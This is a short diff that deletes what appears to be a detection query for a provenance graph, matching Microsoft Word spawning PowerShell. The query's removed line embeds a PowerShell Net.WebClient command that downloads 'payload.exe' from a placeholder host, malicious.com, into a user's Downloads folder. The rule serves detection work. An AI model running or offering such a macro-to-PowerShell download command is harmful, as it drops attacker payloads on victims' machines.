@@ -1,2 +1,0 @@
-
-srcNode.Image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" AND srcNode.Cmdline: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n" AND srcNode.Type: "Process" AND dstNode.Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" AND dstNode.Cmdline: "powershell.exe -Command (New-Object Net.WebClient).DownloadFile('http://malicious.com/payload.exe', 'C:\\Users\\User\\Downloads\\payload.exe')" AND dstNode.Type: "Process" AND relation: "Process Create"
